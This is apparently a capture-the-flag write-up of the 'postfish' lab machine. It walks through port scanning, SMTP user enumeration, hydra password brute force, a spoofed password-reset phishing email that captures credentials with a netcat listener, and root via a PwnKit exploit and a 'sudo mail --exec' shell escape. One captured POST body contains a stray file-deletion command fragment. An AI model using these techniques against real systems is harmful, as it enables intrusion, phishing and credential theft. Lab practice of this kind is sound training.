## NMAP
```sh
sudo nmap -sC -sV -p- 192.168.55.137
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 20:45 CDT
Nmap scan report for 192.168.55.137
Host is up (0.046s latency).
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: STLS CAPA TOP AUTH-RESP-CODE UIDL USER PIPELINING SASL(PLAIN) RESP-CODES
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: AUTH=PLAINA0001 ID have LOGIN-REFERRALS Pre-login LITERAL+ SASL-IR capabilities IMAP4rev1 listed IDLE STARTTLS more post-login OK ENABLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: ID AUTH=PLAINA0001 have LOGIN-REFERRALS LITERAL+ SASL-IR capabilities IMAP4rev1 listed IDLE Pre-login more post-login OK ENABLE
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) PIPELINING RESP-CODES CAPA TOP AUTH-RESP-CODE UIDL USER
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.37 seconds

```

## User enum
Visiting the website I was greated with needing to add postfish.off into dns.
I then located the team page which included the team members:
```
Claire Madison
Mike Ross
Brian Moore
Sarah Lorem
```

I used this script to generate usernames and place them into users.txt
https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py

```smtp-user-enum
smtp-user-enum -M VRFY -U /home/kali/OPG/postfish/users.txt -t 192.168.55.137
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /home/kali/OPG/postfish/users.txt
Target count ............. 1
Username count ........... 395
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Mar 15 20:53:42 2023 #########
192.168.55.137: Claire.Madison exists
192.168.55.137: Mike.Ross exists
192.168.55.137: Brian.Moore exists
192.168.55.137: Sarah.Lorem exists
######## Scan completed at Wed Mar 15 20:55:23 2023 #########
4 results.

395 queries in 101 seconds (3.9 queries / sec)

```

```
cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/OPG/postfish/cewl.txt
```
Depth: 5 Minimum word length: 3

```
hydra -L OPG/postfish/verifiedusers.txt -P OPG/postfish/cewl.txt imap://postfish.off
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-16 22:57:37
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2565 login tries (l:19/p:135), ~161 tries per task
[DATA] attacking imap://postfish.off:143/
[STATUS] 96.00 tries/min, 96 tries in 00:01h, 2469 to do in 00:26h, 16 active
[STATUS] 64.00 tries/min, 192 tries in 00:03h, 2373 to do in 00:38h, 16 active
[STATUS] 47.28 tries/min, 368 tries in 00:07h, 2197 to do in 00:47h, 16 active
[STATUS] 48.66 tries/min, 768 tries in 00:15h, 1797 to do in 00:37h, 16 active
[143][imap] host: postfish.off   login: sales   password: sales
[STATUS] 51.41 tries/min, 1634 tries in 00:31h, 931 to do in 00:19h, 16 active
[STATUS] 52.22 tries/min, 1921 tries in 00:36h, 644 to do in 00:13h, 16 active
[STATUS] 50.21 tries/min, 2098 tries in 00:41h, 467 to do in 00:10h, 16 active
```
I found that I need to remove common found users in smtp or else you get false positives.
filter, man, root, etc..

Found that we have sales:sales for email.

Logged in on pop3.

```
telnet 192.168.55.137 110
Trying 192.168.55.137...
Connected to 192.168.55.137.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
USER sales
+OK
PASS sales
+OK Logged in.
list
+OK 1 messages:
1 683
.
retr 1 
+OK 683 octets
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
        by postfish.off (Postfix) with SMTP id 7712145434
        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
.
```

Pasword reset links? No other emails present lets me know we might be able to get them click a reset link.
Picked Brian Moore to start as he is the Sales Manager. I added others but did not get a response.
```
 nc -v postfish.off 25   
postfish.off [192.168.55.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
helo teset
250 postfish.off
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Hi Brian,

Please follow this link to reset your password: http://192.168.49.55/

Regards,

.
250 2.0.0 Ok: queued as 5B4294543F

500 5.5.2 Error: bad syntax
```

We got a listener setup:
```
nc -lvnp 80        
listening on [any] 80 ...
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.137] 47968
POST / HTTP/1.1
Host: 192.168.49.55
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE  
```

We have credentials now!

brian.moore:EternaLSunshinE

cve-2021-4034-poc.c
https://github.com/arthepsy/CVE-2021-4034
```
brian.moore@postfish:/tmp$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
brian.moore@postfish:/tmp$ ./cve-2021-4034-poc
# whoami
root
# cd /root 
# ls
disclaimer  disclaimer.sh  mail.sh  proof.txt  snap
# cat proof.txt
```

## Correct Method

https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish

A Google search on 'postfix disclaimer' results in the following being the first result on Google:
https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze
![[spaces_-MFlgUPYI8q83vG2IJpI_uploads_git-blob-4f92fb14bc9955dc6b467e804dbaf4e51a229330_image.webp]]

Reading through the article essentially we see that for any emails included in the file `/etc/postfix/disclaimer_addresses`. When any of these addresses send or recieve an email the following file gets executed `/etc/postfix/disclaimer`. The file takes the contents of `/etc/postfix/disclaimer.txt` and appends it to the emails.
```
helo test
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA

Shell please

.

QUIT
```

![[spaces_-MFlgUPYI8q83vG2IJpI_uploads_git-blob-b94b839fed1eed990531c038fbe5444047e4ecc6_image.webp]]

After doing so we should receive a shell
![[spaces_-MFlgUPYI8q83vG2IJpI_uploads_git-blob-ab40b7173d36671f6f6432b96e5b4b63d1bf5893_image.webp]]

From here I checked sudo permissions with `sudo -l` and found that we can run the `mail` binary as any user without a password.
![[spaces_-MFlgUPYI8q83vG2IJpI_uploads_git-blob-29fc3f7cde02ef9f0f157843cac83e9123f78593_image.webp]]

Referring to GTFOBins we can use this to gain a root shell.

![[spaces_-MFlgUPYI8q83vG2IJpI_uploads_git-blob-c476006b1c9f04bdf606bb3be7944b1171e233a1_image.webp]]

```
sudo mail --exec='!/bin/bash'
```

We then gain a root shell.